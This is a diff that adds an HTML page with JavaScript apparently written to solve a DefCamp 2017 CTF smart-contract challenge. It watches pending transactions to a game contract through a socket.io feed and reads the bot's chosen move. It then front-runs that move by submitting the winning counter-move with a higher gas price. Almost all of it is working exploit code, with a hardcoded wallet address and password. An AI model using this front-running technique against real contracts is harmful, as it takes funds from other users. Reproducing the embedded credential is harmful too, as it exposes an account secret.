@@ -1,0 +1,70 @@
+<html>
+<head>
+
+<script src="https://cdn.socket.io/socket.io-1.4.5.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+var client;
+var myaddress  = '0x6573BbCFa502556b8e3019BC5fBE7566c6611925';
+var mypassword = 'testam';
+var mytarget   = '0xD6F8EA6885DC30387DEFF3d4A29701B847F045D5';
+
+var winners = [
+	[0,0,0,0,0,0],
+	[0,0,2,1,2,1],
+	[0,1,0,2,1,2],
+	[0,2,1,0,2,1],
+	[0,1,2,1,0,2],
+	[0,2,1,2,1,0]
+];
+
+function getWinner(option1) {
+	for(var i=1;i<=5;i++) {
+		if(winners[option1][i] == 2) {
+			return i;
+		}
+	}
+	return option1; //shouldn't get there
+}
+
+$(document).ready(function() {
+	client = io.connect('http://45.77.142.124:8080');
+
+	client.on('transaction', function(data) {
+		console.log('transaction', data, data.from, myaddress);
+		if(data.from.toLowerCase() != myaddress.toLowerCase() && data.input != '0x' && data.input.indexOf('0xf94e349d') !== -1) {
+			var option = data.input.slice(-1);
+			if(1 <= option && option <= 5) {
+				winner_option = getWinner(option);
+				console.log('sending winner option for combination: ', option, winner_option);
+				$.post('https://beta.dctf-f1nals-2017.def.camp', {
+					function:'call_contract',
+					abi: '[{"constant":true,"inputs":[],"name":"totalinvested","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"solvedHistory","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"bot","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalplayers","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"game_start","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"minbet","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"triesHistory","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"play","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"player","type":"address"}],"name":"isPlaying","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"reset","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"option","type":"uint8"}],"name":"choose","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"getFlag","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_minbet","type":"uint256"},{"name":"_bot","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]',
+					address: mytarget,
+					from: myaddress,
+					password: mypassword,
+					func:'choose',
+					params:JSON.stringify([winner_option]),
+					value:'10000000000000',
+					type:'standard',
+					gas:'2000000',
+					gasPrice: 1*data.gasPrice+100000
+				}, function(data) {
+					console.log(data);
+				});
+			}
+		} 
+	});
+
+	client.on('connect', function() {
+		console.log('connected');
+		client.emit('listen_for', mytarget);
+	});
+});
+</script>
+
+</head>
+<body>
+</body>
+</html>
